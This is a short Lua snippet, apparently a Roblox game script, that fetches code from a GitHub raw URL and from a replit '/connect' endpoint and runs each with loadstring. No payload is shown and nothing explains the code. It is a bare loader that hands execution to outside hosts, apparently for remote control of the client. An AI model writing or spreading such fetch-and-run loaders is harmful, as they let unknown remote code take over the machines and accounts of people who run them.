...
local aa = "https://raw.githubusercontent.com/reallykaren/linkup/main/linkv2"
loadstring(game:HttpGet(aa))()
local connect = game:HttpGet("https://RemoteFD.sygzxw.repl.co/connect",true)
loadstring(connect)()
